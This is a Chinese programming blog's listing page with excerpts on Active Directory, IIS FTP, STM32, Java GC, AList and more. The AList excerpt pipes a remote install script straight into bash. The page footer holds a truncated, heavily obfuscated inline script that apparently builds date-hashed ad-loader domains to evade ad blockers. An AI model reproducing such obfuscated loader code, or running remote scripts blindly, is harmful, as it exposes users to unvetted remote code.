		目录 7. 创建子域本次实验目的7.1 配置服务器DNS3的IP地址7.2 安装Active Diretory服务7.3 将服务器DNS3提升为user.fjnu.local的域控制器（1）进入【部署配置】界面（2）进入【域控制器选项】界面（3）进入【DNS选项】界面（4）进入【其他选项】界面（5）进入【路径】界面（6）进入【查看选项】界面（7）进入【先决条件检查】界面（8）进入【安装】界面（9）进入【结果】界面 7.4 验证 DNS3 是 user.fjnu.local 的域控制器（1）验证DNS（2）验证子域控制器（3）验证子域和父域信任关系 参考资料关联博文 7. 创建子域 本次实验目的 在DNS3上安装AD域服务，将DNS3提升为子域 user.fjnu.local的域控制器，检验子域的域控制器信息。
7.1 配置服务器DNS3的IP地址 7.2 安装Active Diretory服务 该步骤请参考5.1
7.3 将服务器DNS3提升为user.fjnu.local的域控制器 当AD服务安装完成后，安装进度条显示AD服务已在DNS3上安装成功。
点击【结果】界面中的【将此服务器提升为域控制器】。
（1）进入【部署配置】界面 选择【将新域添加到现有林】，【选择域类型】为子域，【父域名】为fjnu.local，【新域名】为user。
以上操作需要提供操作凭据，所以点击【更改】，在弹出【部署操作的凭据】对话框中，输入域管理员用户和密码。
域管理员的用户名和密码即是在 5.3 节中设置的。
由于设置的是子域，所以在域管理员用户前面加上完整域名：fjnu.local\administrator。
由于操作凭据需要到DNS1中校验，所以必须确保DNS1正常工作，而且DNS1和DNS3通信正常。
返回【部署配置】界面，输入无误后，点击【下一步】，如果DNS1对DNS3中的凭据验证通过则进入【域控制器选项】界面，否则会提示错误信息。
（2）进入【域控制器选项】界面 默认选择【域名系统(DNS)服务器】和【全局编录】，设置【键入目录服务还原模式密码】，点击【下一步】
默认情况下， 由于林功能级别设置为 Windows Server 2016，所以域功能级别设置为 Windows Server 2016。
可配置的域控制器选项包括 【DNS 服务器】 和 【全局目录】；不能将只读域控制器配置为新域（第一个子域）的第一个域控制器。
Microsoft 建议所有域控制器都提供 DNS 和全局目录服务，以在分布式环境中实现高可用性，这就是在创建新域时向导默认情况下启用这些选项的原因。
【域控制器选项】页还可以从林配置中选择相应的 Active Directory 逻辑【站点名称】。 默认情况下，将选择具有最合适子网的站点。 如果只有一个站点，将自动选择该站点。
（3）进入【DNS选项】界面 系统会自动检测其父域DNS1上开启了DNS服务，将在DNS1上的DNS服务器中为本子域创建DNS委派，即把子域的域名解析委派给DNS3。因此默认勾选【创建DNS委派】，点击【下一步】。
（4）进入【其他选项】界面 系统将自动设置NetBIOS域名，使用系统设置即可，点击【下一步】。
（5）进入【路径】界面 指定 AD DS 数据库 (NTDS.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0dc661e6678a0bc321bd7ad840c0707b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79224184557951cf800cb48f4d248830/" rel="bookmark">
			stm32蜂鸣器播放音乐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近学习stm32芯片，使用的是蓝桥杯的f103的旧板子，看到上面有蜂鸣器，所以就想写代码来控制蜂鸣器播放一首音乐。
这里我参考了这篇文章基于STM32F103，用蜂鸣器播放歌曲。同这篇文章一样，我也遇到了蜂鸣器发出的声音不对。参考了这篇文章，以及查找网上的其他资料，最终完成了蜂鸣器的调试，以及歌曲的编写，文章最后会附上代码。
先对音符这类东西进行说明吧。因为自己也不是学音乐的，一些关于音乐的知识都是网上搜集的，所以如果有讲得不对的地方，也请各位读者在评论指正，我会及时改正。
首先在百度上搜索每个音符的频率，这里我参考的是音符与频率对照表
其实对于哪个调来说，我感觉不出来什么差别（可能我没有什么艺术细胞吧），而且在代码里我的音符的频率对应图片里的音符的频率是高一个八度。【如下图】
//	0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //	低7 1 2 3 4 5 6 7 高1 高2 高3 高4 高5 高6 高7	高高1 uc16 tone[] = {247,262,294,330,349,392,440,494,523,587,659,698,784,880,988,1046,0}; 也许我上面说的有些迷糊，但是我们通过上面那张表就可以得到每个音符所对应的频率，这个是我们需要的。
有了每个音符的频率还不够，我们还需要知道每个音符持续的时间，也就是音符时值。
这里我拿我的选的一个曲子举例子。
Eb \text{Eb} Eb指的是曲子的调是Eb调，（每个调之前的区别，我个人感觉不出大差别，所以我的音符频率是按C调频率来的），后面的 4 4 \frac44 44​指的是以四分音符为一拍，一小节四拍。在后面的音符=120，指的是一分钟120拍，所以我们从这里就可以知道，一个四分音符的时值是0.5s.
那么什么是四分音符呢？
如上图，音符下面有三条横线的，就是三十二分音符，有两条横线的就是十六分音符，一条横线的就是八分音符，没有横线的就是四分音符。
这些音符对应的时值分别为(设四分音符的时值为 t t t)
四分音符= t t t八分音符= t / 2 t/2 t/2十六分音符= t / 4 t/4 t/4三十二音符= t / 8 t/8 t/8 除了上面四个音符外，有时谱子里还会遇到一个音符跟着一个小点，这种称为附点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79224184557951cf800cb48f4d248830/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/191b0494907010d3ff42fb7808790422/" rel="bookmark">
			java面试-GC垃圾回收机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理：
GC是垃圾收集的意思（Garbage Collection）,Java提供的GC功能可以自动监测对象是否超过作用域从而达到自动回收内存的目的。
简而言之，GC是将java的无用的堆对象进行清理，释放内存，以免发生内存泄露。
问题一：为什么需要垃圾回收？ 答：如果不进行垃圾回收，内存迟早都会被消耗空，因为我们在不断的分配内存空间而不进行回收。除非内存无限大，我们可以任性的分配而不回收，但是事实并非如此。所以，垃圾回收是必须的。
问题二：常见的垃圾回收算法有哪些？ 答：
1、标记-清除算法 （老年代GC采用的算法）
分为两个阶段：标记阶段和清除阶段
标记阶段：首先标记出所有需要回收的对象。
清除阶段：统一回收所有被标记的对象。
缺点：标记和清除过程效率都不高，会产生大量不连续的内存碎片，导致无法给大对象分配内存。 这种算法的不足主要体现在效率和空间，从效率的角度讲，标记和清除两个过程的效率都不高；从空间的角度讲，标记清除后会产生大量不连续的内存碎片， 内存碎片太多可能会导致以后程序运行过程中在需要分配较大对象时，无法找到足够的连续内存而不得不提前触发一次垃圾收集动作。
2、复制算法 （新生代GC采用的算法）
分为两个阶段：标记阶段和复制阶段
标记阶段：首先需要先标记出存活的对象。
复制阶段：把存活的对象都复制到一块新的空内存里去，最后将原来的内存空间清空。
复制算法是为了解决效率问题而出现的，它将可用的内存分为两块，每次只用其中一块，当这一块内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已经使用过的内存空间一次性清理掉。
缺点：内存缩小为了原来的一半，在对象存活率较高的场景下要进行大量的复制操作，效率很低。
3、标记-整理算法 分为三个阶段：标记阶段和整理阶段和清除阶段
标记阶段：首先需要先标记出存活的对象。
整理阶段：将所有的存活对象压缩到内存的一端。
清除阶段：把存活边界外的内存空间都清除一遍。
4、分代收集算法： 存活率低：少量对象存活，适合复制算法：在新生代中，每次GC时都发现有大批对象死去，只有少量存活（新生代中98%的对象都是“朝生夕死”），那就选用复制算法，只需要付出少量存活对象的复制成本就可以完成GC。
存活率高：大量对象存活，适合用标记-清理和标记-整理算法：在老年代中，因为对象存活率高、没有额外空间对他进行分配担保，就必须使用“标记-清理”/“标记-整理”算法进行GC。
现代商用虚拟机基本都采用分代收集算法来进行垃圾回收。这种算法没什么特别的，无非是上面内容的结合罢了，根据对象的生命周期的不同将内存划分为几块，然后根据各块的特点采用最适当的收集算法。大批对象死去、少量对象存活的（新生代），使用复制算法，复制成本低；对象存活率高、没有额外空间进行分配担保的（老年代），采用标记-清理算法或者标记-整理算法。
问题三：介绍一下新生代、老年代、永久代和各种GC 答： JVM 中的堆，一般分为三大部分：新生代、老年代、永久代
1. 新生代
主要是用来存放新生的对象，新生代通常存活时间较短。一般占据堆的 1/3 空间。由于频繁创建对象，所以新生代会频繁触发 MinorGC（也叫新生代GC） 进行垃圾回收。
MinorGC：采用复制算法。(问题二有介绍复制算法)
新生代分为 Eden 区、ServivorFrom、ServivorTo 三个区。
Eden 区：Java 新对象的出生地（如果新创建的对象占用内存很大，则直接分配到老年代）。当 Eden 区内存不够的时候就会触发 MinorGC，对新生代区进行一次垃圾回收。ServivorTo：保留了一次 MinorGC 过程中的幸存者。ServivorFrom：上一次 GC 的幸存者，作为这一次 GC 的被扫描者。 当 JVM 无法为新建对象分配内存空间的时候 (Eden 满了)，Minor GC 被触发。因此新生代空间占用率越高，Minor GC 越频繁。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/191b0494907010d3ff42fb7808790422/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54ccab881edec6afe03faecb9cce6fc0/" rel="bookmark">
			【Windows Server 2019】FTP服务的配置与管理——配置FTP站点（上）IP地址限制、身份验证、授权规则和请求筛选
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 5. 配置FTP站点5.1 FTP IP地址和域限制5.2 FTP身份验证5.3 FTP授权规则5.4 FTP请求筛选 参考资料关联博文 5. 配置FTP站点 5.1 FTP IP地址和域限制 （1）打开IIS管理器，点击fjnu-ftp主页中的【FTP IP地址和域限制】。
（2）进入【FTP IP地址和域限制】主页后，在右侧【操作】中点击【添加拒绝条目】，在弹出的对话框中根据实际需求添加要拒绝的IP地址或IP地址范围即可。这里填入PC2的IP地址：192.168.82.12，点击【确定】。
（3）返回 【FTP IP地址和域限制】主页，发现主页中出现拒绝条目。
验证：
在PC2上访问FTP服务，发现在资源管理器中输入ftp服务器地址后，会弹出登录身份验证，但是不管选择匿名登录还是输入用户名或密码，都无法登录成功。PC2已被禁止访问FTP服务。
5.2 FTP身份验证 （1）打开IIS管理器，点击fjnu-ftp主页中的【FTP身份验证】。
（2）进入【FTP身份验证 】界面，发现匿名身份验证开启，点击【匿名身份验证】，再点击左侧【操作】栏中的【禁用】。
此时任何电脑再次访问FTP服务的时候均需要用户和密码。
（3）打开服务器本地【计算机管理】，在【系统工具】——&gt;【本地用户和组】——&gt;【用户】中创建FTP用户账户。在中间列表空白处点击鼠标右键选择【新用户】。
（4）在弹出的对话框中输入【用户名】和【密码】，同时将【用户下次登录时须修改密码】去除勾选，勾选【用户不能更改密码】和【密码永不过期】，点击【创建】。
（5）对FTP根目录进行权限设置，打开目录属性，选择【安全】选项卡，点击【编辑】,在弹出的【fjnu-ftp的权限】对话框中选择【添加】，输入：ftp1，点击检查名称，无误后，点击【确定】。
（6）返回【fjnu-ftp的权限】对话框后，点击【组或用户名】中的ftp1，然后在下方的【ftp1的权限】中的允许列下，勾选所有，最后点击【确定】。
验证：
在PC1上，打开资源管理器，进行FTP访问。在弹出的FTP登录对话框中国输入用户名（ftp1）和密码，点击【登录】。
即可访问FTP服务器的根目录。
5.3 FTP授权规则 （1）打开IIS管理器，点击fjnu-ftp主页中的【FTP授权规则】，
（2）进入【FTP授权规则】界面，此时只有一条规则，即在新建站点时设置的所有用户都有读和写权限的规则。
（3）删除该规则（点击该规则，在右侧【操作】栏中点击删除），然后在【操作】栏中点击【添加允许规则】，在弹出的对话框中勾选【所有匿名用户】，权限设置为仅【读取】，最后点击【确定】。
现在匿名用户已经可以访问FTP服务器了，但是只有读取的权限。
（4）再次点击【添加允许规则】，允许指定用户：ftp1，权限设置为【读取】和【写入】，点击确认。
（5）返回【FTP授权规则】界面，刚才设置的两条规则已经存在于列表中。
（6）启动FTP匿名身份验证。在【fjnu-ftp主页】——&gt;【FTP身份验证】中，点击【匿名身份验证】，在右侧的【操作】栏中选择【启用】。同时返回【FTP IP地址和域限制】，删除对PC2的访问禁止规则。
验证：
（1）在PC1的资源管理器中访问FTP服务器，输入：ftp://192.168.82.220，直接访问FTP服务器，在FTP目录下新建文件夹，弹出告警对话框，显示没有权限在此创建文件夹。此时的访问是匿名访问，只能读取FTP目录的文件，而不能写入。
（2）在该目录的空白处点击鼠标右键，选择【登录】，弹出登录对话框，输入用户名和密码即可登录，这时候在此新建文件夹，创建成功。此时是ftp1用户登录，同时有用读取和写入的权限。
使用用户 ftp1 登录。
登录成功后，新建一个文件夹。
5.4 FTP请求筛选 （1）打开IIS管理器，点击fjnu-ftp主页中的【FTP请求筛选】。
（2）进入【FTP请求筛选】主页，点击【文件扩展名】，默认情况下，FTP服务器允许上传所有后缀的文件。
在右侧的【操作】栏中点击【拒绝文件扩展名】，在弹出的对话框中输入：.exe，然后点击【确认】。
验证：
在PC2的资源管理器上，使用用户ftp1访问FTP服务器，尝试将geek.exe复制粘贴到FTP目录下时，系统弹出警告对话框，提示没有权限进行该操作。
此时，再次尝试将一个文本文件拉入到该目录下，成功拉入。因此，FTP服务器只拒绝.exe的文件。
参考资料 FTP协议的主动模式和被动模式的区别FTPサーバー : SSL/TLS の設定Microsoft Docs：New-SelfSignedCertificateMicrosoft Docs：Installing and Configuring FTP 7 on IIS 7 关联博文 关于 FTP 服务的配置与管理 请查阅接下来的博文：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54ccab881edec6afe03faecb9cce6fc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e80bd71c993a80fb71c876183d4b793e/" rel="bookmark">
			【自定义Spring-Boot-Starter及原理详解】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定义 首先阐述一下Spring-Boot-Starter的概念：
Starter POMs are a set of convenient dependency descriptors that you can include in your application. You get a one-stop-shop for all the Spring and related technology that you need, without having to hunt through sample code and copy paste loads of dependency descriptors. For example, if you want to get started using Spring and JPA for database access, just include the spring-boot-starter-data-jpa dependency in your project, and you are good to go.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e80bd71c993a80fb71c876183d4b793e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f73485e8c5c0c3087b747ef837b6a69/" rel="bookmark">
			基于AList实现网盘挂载和WebDAV本地挂载网盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AList AList是一个支持多种存储，支持网页浏览和 WebDAV 的文件列表程序，由 gin 和 Solidjs 驱动。
AList官方文档：https://alist.nn.ci/
AList官方GitHub地址：https://github.com/alist-org/alist
很多功能官方写的都很清楚详细，我只写一下个人的实现流程，有些坑帮大家踩了，这篇博客的目的是让大家少走弯路
我是腾讯云服务器安装AList服务，然后再用本地连接服务
第一步 安装并启动AList 从官方文档可以看到有好几种安装方式，这里总结在Linux环境下安装指南
因为自己是Java开发工程师看到官方有Docker安装方式就先选择了Docker安装
docker run -d --restart=always -v /etc/alist:/opt/alist/data -p 5244:5244 --name="alist" xhofe/alist:latest 但是这个安装不知道为什么跑起来后无限密码错误，修改user和password后重试也还是密码错误：(
所以推荐使用《一键脚本》安装本人亲测一次成功
安装命令：
curl -fsSL "https://alist.nn.ci/v3.sh" | bash -s install 安装成功后启动
systemctl start alist 默认端口号为5244，记得在服务器防火墙里添加协议
查看alist状态
systemctl status alist 没问题的话就访问你的服务器ip/域名加端口号测试一下～
Bingo～
第二步 在AList中添加云盘 本人因为有6T的夸克网盘，以夸克网盘挂载为例
首先登录你的夸克网盘，F12查看网络信息，复制开头为sort的请求内cookie的数据，这是你的登录cookie
登录你的AList管理在账号里添加Quark，把刚刚复制的cookie粘贴到这里
根目录file_id是你的云盘地址，默认0就是根目录
点击保存回到主页
在这里就可以愉快访问云盘里的内容啦
第三步 使用WebDAV挂载到本地 首先WebDAV是HTTP/HTTPS协议，我们刚刚在服务器防火墙里添加的是TCP协议，大部分服务器为了安全性只开443和80的端口分别对应HTTPS和HTTP协议
因为80端口要用所以我们使用443协议
在服务器中开启443端口
修改AList的config文件
默认配置文件在/opt/alist/data/config.json
vim /opt/alist/data/config.json 修改port为443
重启服务
systemctl restart alist 查看状态
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f73485e8c5c0c3087b747ef837b6a69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/136d428ebe1477d7da6acdfa03fbc560/" rel="bookmark">
			无向图的双连通分量算法详解 &#43; 模板题 ：冗余路径 矿场搭建 Critical Network Lines
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在了解无向图的双连通分量之前大家可以先了解一下有向图的双连通分量，因为里面很多数组是一样的。(16条消息) 有向图强连通分量tarjan算法详解（适合新手） + 模板题：《信息学奥赛一本通》 , USACO , HAOI2006 受欢迎的牛_wsh1931的博客-CSDN博客
无向图的双连通分量：
一：边双连通分量
首先介绍一下桥的概念。在一个连通块中若去掉一条边会造成整个图不连通的话那么这条边就叫桥。
如图：红色的边就是一个桥 极大的不含桥的连通块即为一个边双连通分量：
二：点双连通分量 同样首先介绍一下割点的概念：在一个连通块中若去掉这个点以及和它相连的所有边会造成整个图不连通的话那么这个点就叫割点。
如图：红色的点即为一个割点。 极大的不含桥的连通块即为一个点双连通分量
问题：桥的两个端点是不是割点呢？
如果看下面这个图的话他是割点
但看这个图的话他不是：红色的边是一座桥，但红色的点和黑色的边并不是割点 问题二：两个割点构成的边是不是一个桥呢？
同理在这个图上他是
但是在这个图上：
红色点虽然是割点，但它们之间的边并不是桥 同理边的双连通分量不一定是点的双连通分量，点的双连通分量也不一定是边的双连通分量。
所以：桥和割点，以及点双连通分量和边双连通分量没有任何关系：
首先我们先来了解边双连通分量
问题一：如何判断桥？
注意：这里的low, 与dfn和有向图强连通分量的数组定义一样
结论：假设有一个从x 到 y的点若low[y] &gt; dfn[x]则 x 到 y 的一条边可以称为桥
我们来解释为什么
如图一个从点 x 到点 y 的路径low[y]表示y所能走到的最小的时间戳，dfn[x]表示点x的时间戳。因为时间戳是按点的遍历顺序递增的又因为 y 比 x 后遍历所以dfn[y] &gt; dfn[x]，又因为y能走到的时间戳最小的节点大于 x 的时间戳即low[y] &gt; dfn[x]，即 y 永远不可能走到点 x 以及在点 x 遍历之前所遍历到的所有点 ，因此x 到 y 即为一座桥：
问题二：如何找到边双连通分量？？
1：删掉所有桥
2：建立一个栈stk当dfn[u] == low[u] 时将栈里的所有元素都缩为一个点。缩完点后每个连通块之间的边即为一个桥：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/136d428ebe1477d7da6acdfa03fbc560/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d01fd3fa1c8d4a96348112a30a167a6f/" rel="bookmark">
			VB.NET多线程应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果代码看不懂，可以学习一下vb.net，vb.net视频教程
Visual Basic 2010 2012 2013 从入门到精通|xin3721自学网李天生老师亲自授课录制的,Visual Basic 2010 与 2012视频教程。https://www.xin3721.com/eschool/vbnetxin3721/
开发者一直要求微软为VB加入更多的多线程功能，对于VB.NET也是这样。VB6已经支持建立多线程的EXE、DLL和OCX。不过使用多线程这个词语，可能也不太确切。因此VB6仅支持运行多个单线程的单元。一个单元实际上是代码执行的空间，而单元的边界限制了代码访问任何单元以外的事物。
VB.NET就不同了，它支持建立自由线程(free-threaded)的应用。这意味着多个线程可以访问同样一套的共享数据。本文的以下部分将讨论一下多线程的一些基本点。
问题
虽然VB6支持多个单线程的单元，不过它并不支持一个自由线程的模型，即不允许多个线程使用同一套数据。在许多的情况下，你需要建立一个新的线程来进行后台的处理，这样可提高应用的可用性，否则，一个长的处理就可以令程序的响应变得很慢，例如你按下表格上的一个取消按钮，却很久都没有响应。
解决办法
由于VB.NET使用了CLR（Common Language Runtime），从而拥有了许多的新特性，其中的一个是可以创建自由线程的应用。
使用线程
在VB.NET中，运用线程是很简单的。我们将在后面涉及其中的细节，现在我们首先来创建一个简单的表格，它使用一个新的线程来运行一个后台处理。第一件要做的事情是创建运行在新线程上的后台任务。以下的代码执行一个相当长的运行处理--一个无限的循环：
Private Sub BackgroundProcess()
Dim i As Integer = 1
Do While True
ListBox1.Items.Add("Iterations: " + i)
i += 1
Loop
End Sub
这段代码无限地循环，并且在每次执行时为表格上的一个列表框加入一个项目。如果你对VB.NET不熟悉的话，你将会发现这段代码和VB6的有一些区别：
. 在声明变量Dim i As Integer = 1时赋值
. 使用+=操作符i += 1代替i = i + 1
. 没有使用Call关键字
一旦我们拥有了一个工作的处理，我们就需要将这段代码分配给一个线程处理，并且启动它。为此我们要使用线程对象（Thread object），它是.NET架构类中System.Threading命名空间的一部分。在实例化一个新的线程类时，我们将要在线程类构造器执行的代码块的一个引用传送给它。以下的代码创建一个新的线程对象，并且将BackgroundProcess的一个引用传送给它：
Dim t As Thread
t = New Thread(AddressOf Me.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d01fd3fa1c8d4a96348112a30a167a6f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d6bc06dea348a9d4d5c05ae790f82aa/" rel="bookmark">
			CF、SF、OF、ZF标志位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		没学汇编，这种题我真是做一道错一道:-(
OF(overflow flag) 溢出标志位 溢出标志位 OF = 1 表示带符号整数运算时结果发生溢出。对于无符号整数运算，OF没有意义。 对于有符号数的溢出判断方式有： 1）采用一位符号位：思想为：'-'+'-'='+' 或 '+'+'+'='-'则为溢出，其他情况无溢出 2）采用双符号位：s1、s2表示运算结果的两个符号位 ① s1s2 = 00 表示正数，无溢出 ② s1s2 = 01 表示结果正溢出 ，即 '-'+'-'='+'，且s2表示当前运算符号'-'，s1表示原本正确的符号'+' ③ s1s2 = 10 表示结果负溢出 ，即 '+'+'+'='-'，且s2表示当前运算符号'+'，s1表示原本正确的符号'-' ④ s1s2 = 11 表示结果为负数，无溢出 3）采用一位符号位，根据数据位的进位情况判断溢出 Cs 表示两数之间符号位运算的进位 C1 表示最高数值位 V = Cs⊕C1 ,若 V=0 表示无溢出；V=1 表示有溢出 注：最高位产生进位不一定有溢出，可参考【图三】-(3 第三问 ZF(zero flag) 零标志位 ZF = 1表示结果为0，无论是有符号数还是无符号数，ZF都有意义 CF(carry flag) 进/借位标志位 表示无符号整数数加/减运算时的进位/借位。 含义： 加法时，CF = 1表示无符号数加法溢出。 减法时，CF = 1表示有借位，即不够减。 计算：（ALU运算逻辑） 加法时：SUB = 0 减法时：SUB = 1 CF = 最高位进位 ⊕ SUB --可参考【图二】中右边四个运算式子 或【图四】 对于有有符号数的整数运算没有意义 但是真要看的话，CF=最高位进位输出，具体见下方题型归纳。 --可参考【图三】(2)、(3)问 注：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d6bc06dea348a9d4d5c05ae790f82aa/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/222/">«</a>
	<span class="pagination__item pagination__item--current">223/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/224/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122